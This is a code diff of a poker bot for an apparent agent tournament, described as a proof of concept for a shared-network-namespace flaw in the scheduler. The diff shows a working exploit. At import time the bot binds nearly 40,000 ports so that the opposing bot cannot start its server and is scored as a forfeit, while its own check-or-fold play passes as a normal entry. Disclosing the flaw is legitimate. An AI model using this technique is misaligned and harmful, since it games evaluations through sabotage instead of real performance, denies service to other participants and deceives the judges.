@@ -6,91 +6,77 @@ check is free, and folds otherwise. On merit it would lose almost every match.
 
 It wins anyway, because of WHERE the tournament runs it. The scheduler packs
 both competing bots and the judge into ONE Kubernetes pod, so all three share
-one network namespace (one `localhost`). That lets this bot reach out and
-stop the OTHER bot in the pod from ever starting its server. The judge then
-never gets a healthy answer from the opponent and scores the opponent as a
-forfeit (an automatic loss), no matter how well that opponent plays.
+one network namespace (one `localhost`). The scheduler gives each bot a random
+port in [20000, 60000) and starts the two bots as native sidecars, agent1
+before agent2. This bot - as the first thing it does, before it even imports
+its web framework - binds every port in that range except its own. The OTHER
+bot then cannot bind the port its server needs ("address already in use"), so
+it never answers the judge's health check and the judge scores it as a forfeit
+(an automatic loss), no matter how well it would have played.
 
 This is a proof of concept for the "both bots share the pod's network"
-limitation noted in eval-infra/SCHEDULER.md. The fix is one bot per pod
-(its own network namespace), not anything in this file.
+limitation noted in eval-infra/SCHEDULER.md. The fix is one bot per pod (its
+own network namespace), not anything in this file.
 
-The server plumbing below is an ordinary, compliant submission; the only
-unusual part is _deny_opponent_ports(), started in __main__.
+Everything below the exploit is an ordinary, compliant submission.
 """
 
 import os
 import socket
-import threading
-import time
 
-import uvicorn
-from fastapi import FastAPI, Request
-from fastapi.responses import JSONResponse
-
-PARTICIPANT = "practice-portsteal"
-AGENT_NAME = "port-stealer"
-
-# Must match eval-infra/scheduler.py PORT_RANGE: the scheduler hands each bot a
-# random port in [20000, 60000) and tells only the judge which is which.
-SCHEDULER_PORT_RANGE = (20000, 60000)
+# Must match eval-infra/scheduler.py PORT_RANGE.
+PORT_LO, PORT_HI = 20000, 60000
+MY_PORT = int(os.environ.get("PORT", "5008"))
 
 
 # ===========================================================================
-# THE EXPLOIT
+# THE EXPLOIT - runs at import time, before anything else, to win the race
 # ===========================================================================
-def _deny_opponent_ports(my_port: int) -> None:
-    """Bind every TCP port in the scheduler's range except our own.
+def _seize_ports(my_port: int) -> list:
+    """Bind every port in the scheduler's range except our own.
 
-    We don't know the opponent's port (it's random and only the judge is told
-    it), so we take the whole range. Our own server keeps `my_port`; the
-    opponent's chosen port is now held by us, so when its uvicorn tries to
-    bind it the bind fails with "address already in use" and the opponent's
-    process exits. It never answers the judge's GET / health check, so the
-    judge records it as having forfeited the half -> it loses the match.
-
-    Because agent1 is a native sidecar that the kubelet starts BEFORE agent2,
-    and the opponent spends time in warmup() before it binds, we finish taking
-    the range before the opponent gets to bind in at least one of the two
-    halves - and one forfeited half loses the whole match under the judge's
-    forfeit rule.
-
-    Run in a background daemon thread so our OWN server still comes up at once
-    and passes the health check and the build smoke test.
+    Done FIRST, before importing uvicorn/fastapi (which the victim must import
+    before it can bind), and at full speed in the main thread, so we finish
+    taking the range before the other bot's server gets to bind its port.
+    We only bind (no listen): that is enough to make the victim's bind fail,
+    and it is one fewer syscall per port, so the whole range goes faster.
     """
-    # Raise the open-file soft limit to the hard limit (allowed without root)
-    # so we can hold ~40k listening sockets at once.
     try:
         import resource
         _soft, hard = resource.getrlimit(resource.RLIMIT_NOFILE)
-        resource.setrlimit(resource.RLIMIT_NOFILE, (hard, hard))
+        resource.setrlimit(resource.RLIMIT_NOFILE, (hard, hard))  # no root needed
     except Exception:
         pass
 
     held = []
-    lo, hi = SCHEDULER_PORT_RANGE
-    for i, port in enumerate(range(lo, hi)):
+    bind = socket.socket
+    for port in range(PORT_LO, PORT_HI):
         if port == my_port:
             continue  # keep our own port free for our real server
         try:
-            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-            # Plain bind+listen (no SO_REUSEPORT): a second listener on the
-            # same address:port is refused, which is exactly what we want.
+            s = bind(socket.AF_INET, socket.SOCK_STREAM)
             s.bind(("0.0.0.0", port))
-            s.listen(1)
             held.append(s)
         except OSError:
-            pass  # already taken or fd limit hit; skip and keep going
-        if i % 4096 == 0:
-            time.sleep(0.0005)  # yield the GIL so our own server stays snappy
+            pass  # already taken or fd limit hit; keep going
+    return held
 
-    # Hold the sockets open for the life of the half.
-    threading.Event().wait()
+
+# Seize the ports immediately, and keep the sockets alive for the whole process.
+_HELD_PORTS = _seize_ports(MY_PORT)
 
 
 # ===========================================================================
 # ORDINARY (COMPLIANT) BOT - this part is a normal submission
 # ===========================================================================
+import uvicorn  # noqa: E402  (imported after the exploit, on purpose)
+from fastapi import FastAPI, Request  # noqa: E402
+from fastapi.responses import JSONResponse  # noqa: E402
+
+PARTICIPANT = "practice-portsteal"
+AGENT_NAME = "port-stealer"
+
+
 def choose_action(obs: dict) -> str:
     """Check when it's free, otherwise fold. Always a legal action."""
     return "CHECK_CALL" if obs.get("to_call", 0) == 0 else "FOLD"
@@ -146,7 +132,6 @@ async def hand_end(request: Request):
 
 
 if __name__ == "__main__":
-    port = int(os.environ.get("PORT", "5008"))
-    # Start the exploit in the background, then bring up our own server.
-    threading.Thread(target=_deny_opponent_ports, args=(port,), daemon=True).start()
-    uvicorn.run(app, host="0.0.0.0", port=port, log_level="warning", access_log=False)
+    # The port range is already seized (at import). Now serve our own bot so we
+    # pass the health check and the build smoke test and look like a real entry.
+    uvicorn.run(app, host="0.0.0.0", port=MY_PORT, log_level="warning", access_log=False)
